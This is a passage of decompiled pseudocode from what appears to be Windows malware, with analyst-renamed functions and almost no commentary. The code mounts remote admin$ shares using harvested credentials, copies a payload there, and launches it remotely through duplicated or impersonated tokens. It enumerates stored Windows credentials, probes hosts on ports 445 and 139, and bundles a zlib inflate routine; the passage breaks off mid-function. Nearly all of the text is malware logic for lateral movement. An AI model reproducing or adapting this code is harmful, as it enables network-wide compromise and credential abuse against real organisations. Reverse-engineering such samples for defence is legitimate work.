	sub_681F6BB0(&v12);
	v9 = &v12;
	while (1)
	{
		v10 = *v9;
		if (v10 == 34)
			a2[v8++] = 92;
		a2[v8] = v10;
		if (!v10)
			break;
		v9 += 2;
		++v8;
	}
	wsprintfW(&a2[v8], L"\"");
	return 1;
}

//----- (681F9987) --------------------------------------------------------
BOOL __stdcall CheckUACPathsAndLaunchProcess(int a1, LPCWSTR lpUserName, LPCWSTR lpPassword, int a4)
{
	signed int v4; // ebx
	LPWSTR v5; // eax
	DWORD v6; // eax
	HANDLE v7; // eax
	BOOL v8; // eax
	int v10; // [esp+Ch] [ebp-11ABCh]
	BOOL v11; // [esp+10h] [ebp-11AB8h]
	DWORD dwErrCode; // [esp+14h] [ebp-11AB4h]
	HANDLE phNewToken; // [esp+18h] [ebp-11AB0h]
	HANDLE TokenHandle; // [esp+1Ch] [ebp-11AACh]
	DWORD ExitCode; // [esp+20h] [ebp-11AA8h]
	DWORD v16; // [esp+24h] [ebp-11AA4h]
	struct _PROCESS_INFORMATION ProcessInformation; // [esp+28h] [ebp-11AA0h]
	struct _STARTUPINFOW StartupInfo; // [esp+38h] [ebp-11A90h]
	struct _NETRESOURCEW NetResource; // [esp+80h] [ebp-11A48h]
	WCHAR Name; // [esp+A0h] [ebp-11A28h]
	char v21; // [esp+2A8h] [ebp-11820h]
	WCHAR ApplicationName; // [esp+4B0h] [ebp-11618h]
	WCHAR pszPath; // [esp+AC8h] [ebp-11000h]
	WCHAR FileName; // [esp+12C8h] [ebp-10800h]
	WCHAR CommandLine; // [esp+1AC8h] [ebp-10000h]

	v4 = 0;
	v11 = 0;
	dwErrCode = 0;
	v16 = 0;
	if (!a1)
	{
		dwErrCode = 87;
		goto LABEL_61;
	}
	Name = 0;
	wsprintfW(&Name, L"\\\\%s\\admin$", a1);
	NetResource.dwScope = 0;
	memset(&NetResource.dwType, 0, 0x1Cu);
	NetResource.lpRemoteName = &Name;
	NetResource.dwType = 1;
	FindFileByName(&v21);
	wsprintfW(&FileName, L"\\\\%ws\\admin$\\%ws", a1, &v21);
	while (1)
	{
		pszPath = 0;
		v16 = WNetAddConnection2W(&NetResource, lpPassword, lpUserName, 0);
		wsprintfW(&pszPath, L"\\\\%ws\\admin$\\%ws", a1, &v21);
		v5 = PathFindExtensionW(&pszPath);
		if (v5)
		{
			*v5 = 0;
			if (PathFileExistsW(&pszPath))
			{
				v11 = 1;
				goto LABEL_58;
			}
			dwErrCode = GetLastError();
		}
		if (CreateSomeFile_2(dword_6820F11C, &FileName, dword_6820F0FC, 1u))
			break;
		v6 = GetLastError();
		dwErrCode = v6;
		if (v6 == 80 || v6 == 53 || v6 == 67 || v16 != 1219)
			goto LABEL_58;
		if (v4)
			goto LABEL_61;
		v4 = 1;
		WNetCancelConnection2W(&Name, 0, 1);
	}
	if (lpUserName && lpPassword)
	{
		CleanUpHeaps_2(lpUserName, lpPassword);
		dword_68206010 = 1;
	}
	TokenHandle = 0;
	phNewToken = 0;
	v7 = GetCurrentThread();
	if (OpenThreadToken(v7, 2u, 1, &TokenHandle))
		DuplicateTokenEx(TokenHandle, 0x2000000u, 0, SecurityImpersonation, TokenPrimary, &phNewToken);
	v10 = 0;
	while (!v11)
	{
		CommandLine = 0;
		ApplicationName = 0;
		ProcessInformation.hProcess = 0;
		ProcessInformation.hThread = 0;
		ProcessInformation.dwProcessId = 0;
		ProcessInformation.dwThreadId = 0;
		memset(&StartupInfo.lpReserved, 0, 0x40u);
		StartupInfo.cb = 68;
		StartupInfo.dwFlags = 1;
		StartupInfo.wShowWindow = 0;
		if (!v10)
			AcceptEulaAndLaunch(&ApplicationName, &CommandLine, a1);
		if (v10 == 1)
		{
			if (!lpUserName || !lpPassword)
				goto LABEL_53;
			InitRemoteLaunch(&ApplicationName, &CommandLine, a1, lpUserName, lpPassword);
		}
		if (!CommandLine
			|| !ApplicationName
			|| (!phNewToken ? (v8 = CreateProcessW(
				&ApplicationName,
				&CommandLine,
				0,
				0,
				0,
				0x8000000u,
				0,
				0,
				&StartupInfo,
				&ProcessInformation)) : (v8 = CreateProcessAsUserW(
					phNewToken,
					&ApplicationName,
					&CommandLine,
					0,
					0,
					0,
					0x8000000u,
					0,
					0,
					&StartupInfo,
					&ProcessInformation)),
				!v8))
		{
			dwErrCode = GetLastError();
			goto LABEL_51;
		}
		WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
		ExitCode = 0;
		GetExitCodeProcess(ProcessInformation.hProcess, &ExitCode);
		if (StartupInfo.hStdError)
			CloseHandle(StartupInfo.hStdError);
		if (StartupInfo.hStdInput)
			CloseHandle(StartupInfo.hStdInput);
		if (StartupInfo.hStdOutput)
			CloseHandle(StartupInfo.hStdOutput);
		if (ProcessInformation.hThread)
			CloseHandle(ProcessInformation.hThread);
		if (ProcessInformation.hProcess)
			CloseHandle(ProcessInformation.hProcess);
		if (v10)
		{
			if (v10 == 1)
			{
				v11 = ExitCode == 0;
				if (ExitCode == 0)
					goto LABEL_51;
			}
		LABEL_49:
			v11 = PathFileExistsW(&pszPath);
			goto LABEL_51;
		}
		if (!ExitCode || ExitCode & 3)
			goto LABEL_49;
		v11 = 1;
	LABEL_51:
		if (++v10 >= 2)
		{
			if (v11)
				break;
		LABEL_53:
			DeleteFileW(&FileName);
			break;
		}
	}
	if (phNewToken)
	{
		CloseHandle(phNewToken);
		phNewToken = 0;
	}
	if (TokenHandle)
		CloseHandle(TokenHandle);
LABEL_58:
	if (!v16)
		WNetCancelConnection2W(&Name, 0, 1);
LABEL_61:
	if (a4)
		*a4 = v16;
	SetLastError(dwErrCode);
	return v11;
}
// 68206010: using guessed type int dword_68206010;

//----- (681F9DC3) --------------------------------------------------------
int  sub_681F9DC3(__m64 a1, __m64 a2, LPCWSTR lpWideCharStr)
{
	int v3; // esi
	int v4; // eax
	int v6; // [esp+4h] [ebp-4000h]

	LOWORD(v6) = 0;
	v3 = 0;
	v4 = sub_681F6BB0(&v6);
	if (v4)
		v3 = SetWideAddress(a1, a2, lpWideCharStr, &v6, v4);
	return v3;
}

//----- (681F9E05) --------------------------------------------------------
BOOL  sub_681F9E05(struct _RTL_CRITICAL_SECTION *eax0, int a1)
{
	struct _RTL_CRITICAL_SECTION *v2; // esi
	_DWORD *v3; // ebx
	LPCWSTR *v4; // eax
	const WCHAR *v5; // ST08_4
	HANDLE v6; // eax
	BOOL v8; // [esp+10h] [ebp-8h]
	int v9; // [esp+14h] [ebp-4h]

	v2 = eax0;
	v8 = 0;
	v9 = 0;
	v3 = GetHeapAndFreeIt(eax0, 3, &v9);
	if (v3)
	{
		do
		{
			v4 = *v9;
			v5 = *(*v9 + 4);
			v9 = 0;
			v8 = CheckUACPathsAndLaunchProcess(a1, *v4, v5, &v9);
			if (v9 == 1203)
				break;
			if (v9 == 1222)
				break;
			if (v9 == 53)
				break;
			if (v9 == 64)
				break;
			if (v9 == 67)
				break;
			if (v8)
				break;
			v9 = 0;
		} while (EnterAndLeaveCritSection_3(v3, v2, &v9));
		v6 = GetProcessHeap();
		HeapFree(v6, 0, v3);
	}
	return v8;
}

//----- (681F9EA4) --------------------------------------------------------
DWORD __stdcall LaunchChecksForAdminPaths(LPVOID lpThreadParameter)
{
	*lpThreadParameter = CheckUACPathsAndLaunchProcess(
		*(lpThreadParameter + 1),
		*(lpThreadParameter + 2),
		*(lpThreadParameter + 3),
		0);
	return 0;
}

//----- (681F9EC7) --------------------------------------------------------
int __stdcall CreateAndHandleThread(int a1, int a2)
{
	int v2; // edi
	void *v3; // esi
	int Parameter; // [esp+Ch] [ebp-1Ch]
	int v6; // [esp+10h] [ebp-18h]
	int v7; // [esp+14h] [ebp-14h]
	int v8; // [esp+18h] [ebp-10h]
	LPVOID lpMem; // [esp+1Ch] [ebp-Ch]
	void ***v10; // [esp+20h] [ebp-8h]
	HANDLE Thread; // [esp+24h] [ebp-4h]

	v2 = 0;
	v10 = 0;
	lpMem = GetHeapAndFreeIt(a2, 0, &v10);
	if (lpMem)
	{
		do
		{
			v3 = **v10;
			Parameter = 0;
			v7 = 0;
			v8 = 0;
			v6 = a1;
			Thread = CreateThread(0, 0, LaunchChecksForAdminPaths, &Parameter, 4u, 0);
			if (Thread)
			{
				if (SetThreadToken(&Thread, v3))
				{
					if (ResumeThread(Thread) == -1)
						GetLastError();
					else
						WaitForSingleObject(Thread, 0xFFFFFFFF);
				}
				CloseHandle(Thread);
			}
			v2 = Parameter;
		} while (!Parameter && EnterAndLeaveCritSection_3(lpMem, a2, &v10));
		EnumProcessHeap(lpMem);
	}
	return v2;
}

//----- (681F9F8E) --------------------------------------------------------
DWORD __stdcall sub_681F9F8E(LPVOID lpThreadParameter)
{
	HANDLE v1; // eax
	struct _RTL_CRITICAL_SECTION *v2; // esi
	int *v3; // ebx
	__int16 v5[16]; // [esp+Ch] [ebp-2Ch]
	struct _RTL_CRITICAL_SECTION *v6; // [esp+2Ch] [ebp-Ch]
	HANDLE phNewToken; // [esp+30h] [ebp-8h]
	HANDLE TokenHandle; // [esp+34h] [ebp-4h]

	TokenHandle = 0;
	phNewToken = 0;
	v1 = GetCurrentThread();
	if (OpenThreadToken(v1, 0xBu, 1, &TokenHandle))
		DuplicateTokenEx(TokenHandle, 0x2000000u, 0, SecurityImpersonation, TokenImpersonation, &phNewToken);
	v6 = lpParameter;
	v2 = sub_681F7091(36, CompareStringsW, 0, 0xFFFF);
	EnumNetResources(v2, 0);
	EnumerateWindowsCredentials(v2);
	EnterAndLeaveCritSection_4(v2);
	v3 = SomeHeapCleanupFunct(v2, v5);
	if (v3)
	{
		do
		{
			if (CheckUACPathsAndLaunchProcess(v5, 0, 0, 0))
			{
				CheckCritSection(v5, v2, v3);
				CheckCritSection(v5, v6, 0);
			}
			v5[0] = 0;
		} while (LaunchCrit3(v3, v2, v5));
		EnumProcessHeap(v3);
	}
	if (TokenHandle)
	{
		CloseHandle(TokenHandle);
		TokenHandle = 0;
	}
	if (phNewToken)
		CloseHandle(phNewToken);
	return 0;
}

//----- (681FA073) --------------------------------------------------------
DWORD __stdcall sub_681FA073(LPVOID lpThreadParameter)
{
	_DWORD *v1; // ebx
	void *v2; // esi
	LPCRITICAL_SECTION v3; // edi
	HANDLE v4; // eax
	HANDLE v5; // eax
	struct _RTL_CRITICAL_SECTION *v7; // [esp+4h] [ebp-4h]
	LPVOID lpMem; // [esp+10h] [ebp+8h]

	v1 = lpThreadParameter;
	if (lpThreadParameter)
	{
		lpMem = *lpThreadParameter;
		v2 = v1[1];
		v7 = lpParameter;
		v3 = dword_6820F110;
		if (lpCriticalSection && sub_681F9E05(lpCriticalSection, v2)
			|| v3 && CreateAndHandleThread(v2, v3)
			|| lpMem && CheckUACPathsAndLaunchProcess(v2, 0, 0, 0))
		{
			CheckCritSection(v2, v7, 0);
		}
		v4 = GetProcessHeap();
		HeapFree(v4, 0, v2);
		v5 = GetProcessHeap();
		HeapFree(v5, 0, v1);
	}
	return 0;
}

//----- (681FA0FE) --------------------------------------------------------
DWORD __stdcall sub_681FA0FE(LPVOID lpThreadParameter)
{
	HANDLE(__stdcall *v1)(); // ebx
	HANDLE v2; // eax
	LPVOID(__stdcall *v3)(HANDLE, DWORD, SIZE_T); // esi
	_DWORD *v4; // edi
	HANDLE v5; // eax
	__int16 *v6; // eax
	HANDLE v7; // eax
	int v8; // eax
	DWORD v9; // eax
	int v10; // eax
	void **v11; // edi
	void *v12; // ST14_4
	HANDLE v13; // eax
	HANDLE v14; // eax
	__int16 *v15; // eax
	int v16; // ecx
	HANDLE Handles; // [esp+0h] [ebp-28h]
	int v19; // [esp+4h] [ebp-24h]
	int v20; // [esp+8h] [ebp-20h]
	int v21; // [esp+Ch] [ebp-1Ch]
	LPVOID lpMem; // [esp+10h] [ebp-18h]
	struct _RTL_CRITICAL_SECTION *v23; // [esp+14h] [ebp-14h]
	int v24; // [esp+18h] [ebp-10h]
	DWORD dwMilliseconds; // [esp+1Ch] [ebp-Ch]
	DWORD nCount; // [esp+20h] [ebp-8h]
	DWORD v27; // [esp+24h] [ebp-4h]

	v23 = lpParameter;
	v24 = ~(gPrivLevel >> 2) & 1;
	if (~(gPrivLevel >> 2) & 1)
		sub_681F9F8E(0);
	Handles = 0;
	v1 = GetProcessHeap;
	v19 = 0;
	v20 = 0;
	v21 = 0;
	v2 = GetProcessHeap();
	v3 = HeapAlloc;
	v4 = HeapAlloc(v2, 8u, 8u);
	if (v4)
	{
		*v4 = v24;
		v5 = GetProcessHeap();
		v6 = HeapAlloc(v5, 8u, 0x21u);
		v4[1] = v6;
		if (v6)
		{
			lpMem = SomeHeapCleanupFunct(v23, v6);
			if (lpMem)
			{
				v27 = 0;
				dwMilliseconds = 0;
				while (1)
				{
					nCount = 0;
					if (v27 == 4)
					{
						dwMilliseconds = -1;
					}
					else
					{
						v7 = CreateThread(0, 0, sub_681FA073, v4, 0, 0);
						if (!v7)
							break;
						*(&Handles + v27) = v7;
					}
					v8 = 0;
					do
					{
						if (!*(&Handles + v8))
							break;
						++nCount;
						++v8;
					} while (v8 != 4);
					v9 = WaitForMultipleObjects(nCount, &Handles, 0, dwMilliseconds);
					if (v9 == -1)
						break;
					if (v9 == 258)
					{
						v27 = 4;
						v10 = 0;
						while (*(&Handles + v10))
						{
							if (++v10 == 4)
								goto LABEL_24;
						}
						v27 = v10;
					}
					else if (v9 <= nCount - 1)
					{
						v11 = &Handles + v9;
						v12 = *v11;
						v27 = v9;
						CloseHandle(v12);
						*v11 = 0;
					}
				LABEL_24:
					v13 = v1();
					v4 = v3(v13, 8u, 8u);
					if (!v4)
						break;
					v14 = v1();
					v15 = v3(v14, 8u, 0x21u);
					v16 = v24;
					v4[1] = v15;
					*v4 = v16;
					if (!v15 || !LaunchCrit3(lpMem, v23, v15))
						break;
					v3 = HeapAlloc;
					v1 = GetProcessHeap;
				}
				EnumProcessHeap(lpMem);
			}
		}
	}
	return 0;
}
// 6820F144: using guessed type int gPrivLevel;

//----- (681FA274) --------------------------------------------------------
DWORD  SleepAndFreeHeap(__m64 a1, __m64 a2, LPVOID lpThreadParameter)
{
	struct _RTL_CRITICAL_SECTION *v3; // esi
	int *v4; // ebx
	HANDLE v5; // eax
	WCHAR WideCharStr; // [esp+Ch] [ebp-20h]

	Sleep(*lpThreadParameter);
	v3 = lpParameter;
	v4 = SomeHeapCleanupFunct(lpParameter, &WideCharStr);
	if (v4)
	{
		do
		{
			if (sub_681F9DC3(a1, a2, &WideCharStr))
				CheckCritSection(&WideCharStr, v3, v4);
			WideCharStr = 0;
		} while (LaunchCrit3(v4, v3, &WideCharStr));
		EnumProcessHeap(v4);
	}
	v5 = GetProcessHeap();
	HeapFree(v5, 0, lpThreadParameter);
	return 0;
}

//----- (681FA2E8) --------------------------------------------------------
int __stdcall SockSendDataWithTimeOut(int a1, u_short hostshort)
{
	SOCKET v2; // esi
	fd_set writefds; // [esp+10h] [ebp-128h]
	struct sockaddr name; // [esp+118h] [ebp-20h]
	u_long argp; // [esp+128h] [ebp-10h]
	struct timeval timeout; // [esp+12Ch] [ebp-Ch]
	int v8; // [esp+134h] [ebp-4h]

	name.sa_family = 0;
	*name.sa_data = 0;
	*&name.sa_data[4] = 0;
	*&name.sa_data[8] = 0;
	*&name.sa_data[12] = 0;
	writefds.fd_count = 0;
	memset(writefds.fd_array, 0, 0x100u);
	timeout.tv_sec = 0;
	timeout.tv_usec = 0;
	argp = 1;
	v8 = 0;
	v2 = socket(2, 1, 0);
	if (v2)
	{
		name.sa_family = 2;
		*&name.sa_data[2] = a1;
		*name.sa_data = htons(hostshort);
		if (ioctlsocket(v2, -2147195266, &argp) != -1)
		{
			connect(v2, &name, 16);
			writefds.fd_array[0] = v2;
			writefds.fd_count = 1;
			timeout.tv_sec = 2;
			timeout.tv_usec = 0;
			if (select(v2 + 1, 0, &writefds, 0, &timeout) != -1)
			{
				if (__WSAFDIsSet(v2, &writefds))
					v8 = 1;
			}
		}
		closesocket(v2);
	}
	return v8;
}

//----- (681FA3D9) --------------------------------------------------------
signed int __stdcall CheckIfDataWasSent(int a1)
{
	signed int v1; // esi

	v1 = 0;
	if (SockSendDataWithTimeOut(a1, 0x1BDu) || SockSendDataWithTimeOut(a1, 0x8Bu))
		v1 = 1;
	return v1;
}

//----- (681FA520) --------------------------------------------------------
signed int  SomeVersionCheck(__m64 mm0_0, __m64 mm1_0, int a1, int *a2, int a3, int a4)
{
	signed int result; // eax
	signed int v7; // esi
	int v8; // [esp+4h] [ebp-38h]
	int v9; // [esp+8h] [ebp-34h]
	int v10; // [esp+10h] [ebp-2Ch]
	int v11; // [esp+14h] [ebp-28h]
	int v12; // [esp+18h] [ebp-24h]
	int v13; // [esp+24h] [ebp-18h]
	int v14; // [esp+28h] [ebp-14h]

	v13 = 0;
	v14 = 0;
	v8 = a3;
	v9 = a4;
	v10 = a1;
	v11 = *a2;
	result = sub_681FBB31(v8, L"1.2.8", 56);
	if (!result)
	{
		v7 = SomeCompressionFunct(mm0_0, mm1_0, v8, 4);
		if (v7 == 1)
		{
			*a2 = v12;
			result = sub_681FBA60(v8);
		}
		else
		{
			sub_681FBA60(v8);
			if (v7 != 2 && (v7 != -5 || v9))
				result = v7;
			else
				result = -3;
		}
	}
	return result;
}

//----- (681FA5A8) --------------------------------------------------------
int __cdecl InsertCharsIntoBuffer(int a1)
{
	int result; // eax

	result = a1;
	*(a1 + 76) = WhatIsThis_dword_681FD2D0;
	*(a1 + 84) = 9;
	*(a1 + 80) = WhatIsThis_byte_681FDAD0_MightBeWordSized;
	*(a1 + 88) = 5;
	return result;
}
// 681FD2D0: using guessed type int WhatIsThis_dword_681FD2D0[512];

//----- (681FA5CC) --------------------------------------------------------
signed int  SomeCompressionFunct(__m64 a1, __m64 a2, int a3, int a4) // This I think is from somewhere else.
{
	int v4; // ebx
	unsigned int v5; // edx
	unsigned int v6; // edi
	unsigned int v7; // ecx
	int v8; // eax
	int v9; // esi
	unsigned __int8 *v10; // eax
	int v11; // eax
	int v12; // eax
	int v13; // eax
	int v14; // eax
	bool v15; // zf
	unsigned int v16; // ecx
	unsigned int v17; // eax
	char v18; // dl
	unsigned __int8 *v19; // eax
	int v20; // eax
	int v21; // eax
	_DWORD *v22; // ecx
	unsigned __int8 *v23; // eax
	int v24; // eax
	int v25; // eax
	int v26; // eax
	unsigned __int8 *v27; // eax
	int v28; // eax
	int v29; // eax
	int v30; // ecx
	unsigned __int8 *v31; // eax
	int v32; // eax
	int v33; // eax
	int v34; // eax
	int v35; // eax
	unsigned int v36; // ecx
	_DWORD *v37; // edx
	int v38; // eax
	unsigned int v39; // edx
	size_t v40; // edx
	unsigned int v41; // esi
	unsigned int v42; // eax
	unsigned __int8 *v43; // edx
	int v44; // ecx
	int v45; // ecx
	unsigned int v46; // edx
	int v47; // eax
	unsigned int v48; // esi
	unsigned int v49; // eax
	unsigned __int8 *v50; // edx
	int v51; // ecx
	int v52; // ecx
	unsigned int v53; // edx
	int v54; // eax
	unsigned __int8 *v55; // eax
	int v56; // eax
	int v57; // eax
	int v58; // ecx
	int v59; // eax
	signed int result; // eax
	unsigned __int8 *v61; // eax
	int v62; // eax
	int v63; // eax
	int v64; // eax
	unsigned int v65; // eax
	int v66; // ecx
	unsigned __int8 *v67; // eax
	int v68; // eax
	int v69; // eax
	char v70; // al
	unsigned int v71; // edx
	int v72; // ecx
	unsigned __int8 *v73; // eax
	int v74; // eax
	int v75; // eax
	size_t v76; // eax
	unsigned __int8 *v77; // eax
	int v78; // eax
	int v79; // eax
	int v80; // eax
	unsigned int v81; // edx
	int v82; // eax
	int v83; // eax
	bool v84; // cf
	unsigned __int8 *v85; // eax
	int v86; // eax
	int v87; // eax
	int v88; // eax
	__int16 v89; // cx
	int v90; // edx
	int v91; // eax
	int v92; // edx
	int v93; // ecx
	unsigned int v94; // edx
	int v95; // ecx
	unsigned int v96; // edx
	unsigned int v97; // ecx
	unsigned int v98; // edx
	char v99; // cl
	int v100; // eax
	unsigned int v101; // edx
	char v102; // cl
	unsigned int v103; // eax
	int v104; // eax
	unsigned int v105; // ST08_4
	int v106; // eax
	int v107; // ecx
	unsigned int j; // eax
	char v109; // cl
	int v110; // eax
	int v111; // ecx
	int v112; // eax
	unsigned int v113; // ebx
	__int16 v114; // dx
	int v115; // ecx
	int v116; // ecx
	unsigned int v117; // esi
	unsigned __int8 *v118; // eax
	int v119; // eax
	int v120; // eax
	int v121; // eax
	unsigned int v122; // eax
	unsigned int v123; // esi
	char v124; // cl
	int v125; // eax
	int v126; // ecx
	int v127; // eax
	unsigned int v128; // ebx
	__int16 v129; // dx
	int v130; // ecx
	int v131; // ecx
	unsigned int v132; // ecx
	unsigned __int8 *v133; // eax
	int v134; // eax
	int v135; // eax
	int v136; // eax
	unsigned int v137; // ecx
	unsigned int v138; // ecx
	int v139; // eax
	int v140; // eax
	unsigned int v141; // eax
	char *v142; // ebx
	char *v143; // esi
	unsigned __int8 *v144; // eax
	int v145; // eax
	int v146; // eax
	int v147; // eax
	int v148; // ecx
	unsigned int v149; // eax
	int v150; // ecx
	unsigned __int8 *v151; // eax
	int v152; // eax
	int v153; // eax
	signed int v154; // eax
	void *v155; // eax
	signed int v156; // edx
	unsigned int v157; // eax
	int v158; // eax
	int v159; // edi
	unsigned int v160; // eax
	signed int v161; // eax
	unsigned int v162; // [esp-Ch] [ebp-50h]
	unsigned int v163; // [esp-Ch] [ebp-50h]
	char *v164; // [esp-8h] [ebp-4Ch]
	_BYTE *v165; // [esp-8h] [ebp-4Ch]
	unsigned int v167; // [esp+Ch] [ebp-38h]
	int v168; // [esp+Ch] [ebp-38h]
	unsigned int v169; // [esp+10h] [ebp-34h]
	unsigned int v170; // [esp+10h] [ebp-34h]
	size_t v171; // [esp+10h] [ebp-34h]
	int v172; // [esp+10h] [ebp-34h]
	unsigned int i; // [esp+10h] [ebp-34h]
	__int16 v174; // [esp+10h] [ebp-34h]
	int v175; // [esp+10h] [ebp-34h]
	unsigned __int16 v176; // [esp+12h] [ebp-32h]
	unsigned __int16 v177; // [esp+12h] [ebp-32h]
	unsigned int v178; // [esp+14h] [ebp-30h]
	int v179; // [esp+14h] [ebp-30h]
	int v180; // [esp+14h] [ebp-30h]
	int v181; // [esp+18h] [ebp-2Ch]
	int v182; // [esp+18h] [ebp-2Ch]
	int v183; // [esp+18h] [ebp-2Ch]
	unsigned int v184; // [esp+18h] [ebp-2Ch]
	int v185; // [esp+1Ch] [ebp-28h]
	_DWORD *v186; // [esp+20h] [ebp-24h]
	signed int v187; // [esp+24h] [ebp-20h]
	char *Dst; // [esp+28h] [ebp-1Ch]
	size_t Size; // [esp+2Ch] [ebp-18h]
	__int16 v190; // [esp+30h] [ebp-14h]
	char v191; // [esp+32h] [ebp-12h]
	char v192; // [esp+33h] [ebp-11h]
	unsigned int v193; // [esp+34h] [ebp-10h]
	unsigned int v194; // [esp+38h] [ebp-Ch]
	void *Src; // [esp+3Ch] [ebp-8h]
	unsigned int v196; // [esp+40h] [ebp-4h]

	if (!a3)
		return -2;
	v4 = *(a3 + 28);
	v186 = v4;
	if (!v4 || !*(a3 + 12) || !*a3 && *(a3 + 4))
		return -2;
	if (*v4 == 11)
		*v4 = 12;
	v5 = *(v4 + 56);
	v6 = *(v4 + 60);
	Dst = *(a3 + 12);
	Size = *(a3 + 16);
	Src = *a3;
	v7 = *(a3 + 4);
	v187 = 0;
	v8 = *v4;
	v196 = v7;
	v194 = v5;
	v193 = v6;
	v167 = v7;
	v185 = Size;
	v9 = a3;
	while (2)
	{
		switch (v8)
		{
		case 0:
			if (!*(v4 + 8))
			{
				*v4 = 12;
				goto LABEL_140;
			}
			if (v6 < 0x10)
			{
				v10 = Src;
				while (v7)
				{
					v11 = *v10;
					v196 = v7 - 1;
					v12 = v11 << v6;
					v6 += 8;
					--v7;
					v5 += v12;
					v10 = Src + 1;
					v194 = v5;
					Src = Src + 1;
					v193 = v6;
					if (v6 >= 0x10)
						goto LABEL_16;
				}
				goto LABEL_343;
			}
		LABEL_16:
			if (*(v4 + 8) & 2 && v5 == 35615)
			{
				v6 = 0;
				*(v4 + 24) = sub_681FBF51(0, 0, 0);
				v190 = -29921;
				v13 = sub_681FBF51(*(v4 + 24), &v190, 2);
				v5 = 0;
				*(v4 + 24) = v13;
				v194 = 0;
				v193 = 0;
				*v4 = 1;
				goto LABEL_139;
			}
			*(v4 + 16) = 0;
			v14 = *(v4 + 32);
			if (v14)
				*(v14 + 48) = -1;
			if (!(*(v4 + 8) & 1) || (v15 = ((v5 << 8) + (v5 >> 8)) % 0x1F == 0, v5 = v194, !v15))
			{
				*(v9 + 24) = "incorrect header check";
				goto LABEL_25;
			}
			if ((v194 & 0xF) != 8)
			{
				*(v9 + 24) = "unknown compression method";
			LABEL_25:
				*v4 = 29;
				goto LABEL_139;
			}
			v5 = v194 >> 4;
			v6 -= 4;
			v194 = v5;
			v193 = v6;
			v16 = (v5 & 0xF) + 8;
			if (*(v4 + 36))
			{
				if (v16 > *(v4 + 36))
				{
					*(v9 + 24) = "invalid window size";
					goto LABEL_25;
				}
			}
			else
			{
				*(v4 + 36) = v16;
			}
			v6 = 0;
			*(v4 + 20) = 1 << v16;
			v17 = sub_681FBD21(0, 0, 0);
			v18 = ~BYTE1(v194);
			*(v4 + 24) = v17;
			*(v9 + 48) = v17;
			*v4 = v18 & 2 | 9;
			v5 = 0;
		LABEL_29:
			v194 = v5;
			v193 = v6;
			goto LABEL_139;
		case 1:
			if (v6 >= 0x10)
				goto LABEL_37;
			v19 = Src;
			do
			{
				if (!v7)
					goto LABEL_343;
				v20 = *v19;
				v196 = v7 - 1;
				v21 = v20 << v6;
				v6 += 8;
				--v7;
				v5 += v21;
				v19 = Src + 1;
				v194 = v5;
				Src = Src + 1;
				v193 = v6;
			} while (v6 < 0x10);
		LABEL_37:
			*(v4 + 16) = v5;
			if (v5 == 8)
			{
				if (!(v5 & 0xE000))
				{
					v22 = *(v4 + 32);
					if (v22)
						*v22 = 0;
					if (*(v4 + 16) & 0x200)
					{
						v190 = v5;
						*(v4 + 24) = sub_681FBF51(*(v4 + 24), &v190, 2);
					}
					v7 = v196;
					v5 = 0;
					*v4 = 2;
					v194 = 0;
					v6 = 0;
				LABEL_47:
					if (v6 < 0x20)
					{
						v23 = Src;
						while (v7)
						{
							v24 = *v23;
							v196 = v7 - 1;
							v25 = v24 << v6;
							v6 += 8;
							--v7;
							v5 += v25;
							v23 = Src + 1;
							v194 = v5;
							Src = Src + 1;
							if (v6 >= 0x20)
								goto LABEL_51;
						}
						goto LABEL_343;
					}
				LABEL_51:
					v26 = *(v4 + 32);
					if (v26)
						*(v26 + 4) = v5;
					if (*(v4 + 16) & 0x200)
					{
						v190 = v5;
						v191 = BYTE2(v5);
						v192 = HIBYTE(v5);
						*(v4 + 24) = sub_681FBF51(*(v4 + 24), &v190, 4);
					}
					v7 = v196;
					v5 = 0;
					*v4 = 3;
					v194 = 0;
					v6 = 0;
				LABEL_56:
					if (v6 < 0x10)
					{
						v27 = Src;
						while (v7)
						{
							v28 = *v27;
							v196 = v7 - 1;
							v29 = v28 << v6;
							v6 += 8;
							--v7;
							v5 += v29;
							v27 = Src + 1;
							v194 = v5;
							Src = Src + 1;
							if (v6 >= 0x10)
								goto LABEL_60;
						}
						goto LABEL_343;
					}
				LABEL_60:
					v30 = *(v4 + 32);
					if (v30)
					{
						*(v30 + 8) = v5;
						*(*(v4 + 32) + 12) = v5 >> 8;
					}
					if (*(v4 + 16) & 0x200)
					{
						v190 = v5;
						*(v4 + 24) = sub_681FBF51(*(v4 + 24), &v190, 2);
					}
					v7 = v196;
					v5 = 0;
					*v4 = 4;
					v6 = 0;
					v194 = 0;
					v193 = 0;
				LABEL_65:
					if (*(v4 + 16) & 0x400)
					{
						if (v6 < 0x10)
						{
							v31 = Src;
							while (v7)
							{
								v32 = *v31;
								v196 = v7 - 1;
								v33 = v32 << v6;
								v6 += 8;
								--v7;
								v5 += v33;
								v31 = Src + 1;
								v194 = v5;
								Src = Src + 1;
								if (v6 >= 0x10)
									goto LABEL_70;
							}
							goto LABEL_343;
						}
					LABEL_70:
						v34 = *(v4 + 32);
						*(v4 + 64) = v5;
						if (v34)
							*(v34 + 20) = v5;
						if (*(v4 + 16) & 0x200)
						{
							v190 = v5;
							*(v4 + 24) = sub_681FBF51(*(v4 + 24), &v190, 2);
						}
						v6 = 0;
						v194 = 0;
						v193 = 0;
					}
					else
					{
						v35 = *(v4 + 32);
						if (v35)
							*(v35 + 16) = 0;
					}
					*v4 = 5;
				LABEL_78:
					if (*(v4 + 16) & 0x400)
					{
						v36 = *(v4 + 64);
						if (v36 > v196)
							v36 = v196;
						v178 = v36;
						if (v36)
						{
							v37 = *(v4 + 32);
							if (v37)
							{
								v181 = v37[4];
								if (v181)
								{
									v38 = v37[5] - *(v4 + 64);
									v39 = v37[6];
									if (v36 + v38 <= v39)
										v40 = v36;
									else
										v40 = v39 - v38;
									memcpy((v181 + v38), Src, v40);
									v36 = v178;
								}
							}
							if (*(v4 + 16) & 0x200)
								*(v4 + 24) = sub_681FBF51(*(v4 + 24), Src, v36);
							v196 -= v178;
							Src = Src + v178;
							*(v4 + 64) -= v178;
						}
						if (*(v4 + 64))
							goto LABEL_343;
					}
					v7 = v196;
					*(v4 + 64) = 0;
					*v4 = 6;
				LABEL_93:
					if (*(v4 + 16) & 0x800)
					{
						if (!v7)
							goto LABEL_343;
						v41 = v196;
						v42 = 0;
						v43 = Src;
						do
						{
							v44 = v43[v42++];
							v182 = v44;
							v45 = *(v4 + 32);
							v169 = v42;
							if (v45)
							{
								if (*(v45 + 28))
								{
									v46 = *(v4 + 64);
									if (v46 < *(v45 + 32))
									{
										*(*(v45 + 28) + v46) = v182;
